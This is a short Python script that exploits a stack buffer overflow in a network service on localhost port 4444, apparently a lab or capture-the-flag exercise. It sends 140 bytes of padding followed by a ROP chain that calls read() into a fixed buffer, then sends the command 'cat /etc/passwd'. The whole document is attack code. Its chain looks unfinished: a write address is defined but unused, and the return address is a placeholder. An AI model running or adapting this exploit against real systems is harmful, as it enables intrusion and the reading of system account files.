import struct
import socket
import sys
from time import sleep

cmd = "cat /etc/passwd" + "\0"

buffer = 0x08049530
read = 0x0804832c
write = 0x08048442

payload = "A"*140
payload += struct.pack("<I",read)
payload += struct.pack("<I",0x10101010)
payload += struct.pack("<I",0)
payload += struct.pack("<I",buffer)
payload += struct.pack("<I",len(cmd))

addr = ("127.0.0.1",4444)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(addr)
s.send(payload)
sleep(1)
s.send(cmd)
s.close()


